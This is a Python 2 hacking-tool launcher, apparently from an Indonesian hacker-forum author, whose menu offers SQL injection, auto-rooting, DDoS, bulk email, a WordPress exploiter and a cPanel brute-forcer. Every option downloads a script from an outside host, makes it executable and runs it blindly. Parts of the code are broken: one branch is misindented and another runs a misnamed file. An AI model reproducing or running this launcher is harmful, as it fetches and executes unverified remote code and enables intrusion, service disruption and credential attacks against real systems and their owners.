#!/usr/bin/python
# bang@hackermail.com


import os,urllib,sys

print '''
--------------------------------------------------
      ___                     _  _    ___  _  _   
     / _ \                   | || |  / _ \| || |  
 ___| | | |_ __   __ _ ______| || |_| | | | || |_ 
|_  / | | | '_ \ / _` |______|__   _| | | |__   _|
 / /| |_| | | | | (_| |         | | | |_| |  | |  
/___|\___/|_| |_|\__,_|         |_|  \___/   |_|  
                                                  
                                                  
--------------------------------------------------
[#] Author : flazer 404
[#] Greetz : FHI ( Forum Hacker Indonesia ) -=-  KCH ( Kalimantan Cyber Hacked )

[#] Silahkan Pilih Menu Nya ^_^ Jangan Salah Gunakan Yoo 
[1] ----SQLi--LFI--XSS--RFI--Use Proxy--Admin Finder--SubDomain Scanner--MD5 Dictionery Attack--MD5 Decrypter Online--Grab Your IP
[2] ----AutoRoot
[3] ----DdosS
[4] ----Bulk Email Sender/Attachment
[5] ----WordPress EXploiter
[6] ----Joom/WP Scanner.
[7] ----Admin Finder
[8] ----Cpanel Brute
[0] ----Exit


'''


select = raw_input('Please Select a Number: ')

if select == '1':
  link = 'http://flazer-404.com/file-scanner/stoker.py'
  try:
    stoker = urllib.urlopen(link)
    pakistani = open(link.split('/')[-1], 'w')
    pakistani.write(stoker.read())
    pakistani.close()
    stoker.close()
  except:
    print("\tError in Executing Script.\n")
  try:
    os.system("chmod a+x stoker.py")
    os.system("./stoker.py")
  except:
    print("\nError in Executing Script.")

elif select == '2':
  link = 'http://flazer-404.com/file-scanner/stoker1.py'
  try:
    stoker = urllib.urlopen(link)
    pakistani = open(link.split('/')[-1], 'w')
    pakistani.write(stoker.read())
    pakistani.close()
    stoker.close()
  except:
    print("\tError in Executing Script.\n")
  try:
    os.system("chmod a+x stoker1.py")
    os.system("./stoker1.py")
  except:
    print("\nError in Executing Script.")
  
  
elif select == '3':
  link = 'http://flazer-404.com/file-scanner/stoker2.py'
  try:
    stoker = urllib.urlopen(link)
    pakistani = open(link.split('/')[-1], 'w')
    pakistani.write(stoker.read())
    pakistani.close()
    stoker.close()
  except:
    print("\tError in Executing Script.\n")
  try:
    os.system("chmod a+x stoker2.py")
    os.system("./stoker2.py")
  except:
    print("\nError in Executing Script.")

elif select == '4':
  link = 'http://flazer-404.com/file-scanner/stoker3.py'
  try:
    stoker = urllib.urlopen(link)
    pakistani = open(link.split('/')[-1], 'w')
    pakistani.write(stoker.read())
    pakistani.close()
    stoker.close()
  except:
    print("\tError in Executing Script.\n")
  try:
    os.system("chmod a+x stoker3.py")
    os.system("./stoker3.py")
  except:
    print("\nError in Executing Script.")

elif select == '5':
  link = 'http://flazer-404.com/file-scanner/stoker4.py'
  try:
    stoker = urllib.urlopen(link)
    pakistani = open(link.split('/')[-1], 'w')
    pakistani.write(stoker.read())
    pakistani.close()
    stoker.close()
  except:
    print("\tError in Executing Script.\n")
  try:
    os.system("chmod a+x stoker4.py")
    os.system("./stoker4.py")
  except:
    print("\nError in Executing Script.")

elif select == '6':
  link = 'http://flazer-404.com/file-scanner/stoker5.py'
  try:
    stoker = urllib.urlopen(link)
    pakistani = open(link.split('/')[-1], 'w')
    pakistani.write(stoker.read())
    pakistani.close()
    stoker.close()
  except:
    print("\tError in Executing Script.\n")
  try:
    os.system("chmod a+x stoker5.py")
    os.system("./stoker5.py")
  except:
    print("\nError in Executing Script.")

elif select == '7':
  link = 'http://flazer-404.com/file-scanner/admin.py'
  try:
    stoker = urllib.urlopen(link)
    pakistani = open(link.split('/')[-1], 'w')
    pakistani.write(stoker.read())
    pakistani.close()
    stoker.close()
  except:
    print("\tError in Executing Script.\n")
  try:
    os.system("chmod a+x admin.py")
    os.system("./admin.py")
  except:
    print("\nError in Executing Script.")
	
	
	elif select == '8':
  link = 'http://flazer-404.com/file-scanner/cpanel-brute.py'
  try:
    stoker = urllib.urlopen(link)
    pakistani = open(link.split('/')[-1], 'w')
    pakistani.write(stoker.read())
    pakistani.close()
    stoker.close()
  except:
    print("\tError in Executing Script.\n")
  try:
    os.system("chmod a+x cpanel-brute.py.py")
    os.system("./cpanel-brute.py.py")
  except:
    print("\nError in Executing Script.")



else:
  print '''
 ______ _                ____________ _____  
|  ____| |        /\    |___  /  ____|  __ \ 
| |__  | |       /  \      / /| |__  | |__) |
|  __| | |      / /\ \    / / |  __| |  _  / 
| |    | |____ / ____ \  / /__| |____| | \ \ 
|_|    |______/_/    \_\/_____|______|_|  \_\
                                                                 
  '''
  ex = raw_input("Hit 'ENTER' to Exit.")
  sys.exit()